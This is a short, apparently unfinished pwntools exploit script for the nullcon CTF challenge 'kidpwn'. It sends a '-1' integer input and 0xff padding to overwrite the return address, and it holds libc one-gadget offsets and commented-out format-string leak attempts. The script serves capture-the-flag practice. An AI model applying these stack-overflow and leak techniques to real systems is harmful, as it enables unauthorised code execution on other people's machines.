#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./kidpwn"

onegadgets = [0x45216,0x4526a,0xf02a4,0xf1147]

rhp1 = {"host":"pwn2.ctf.nullcon.net","port":5003}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def exploit(conn):
  pay = "-1"+'\x00'
  pay += '\xff'*(0x64-len(pay))
  raw_input()
  conn.send(pay)
  #conn.sendline("-10"+'\x00'+"A"*0x58)
  #0x80 from input is RA
  conn.send('\xff'*0x80)
  #conn.send("%19$p")
  #conn.send("%20$p") #RA from main
  #conn.send("%10$p\n%11$p\n%12$p\n%13$p\n%14$p\n")
  


  #conn.recv(0x88)
  #libcmain = unpack(conn.recv(6).ljust(8,'\x00'))
  #print("libc_start_main: "+hex(libcmain))


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      source ~/pwndbg/gdbinit.py
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

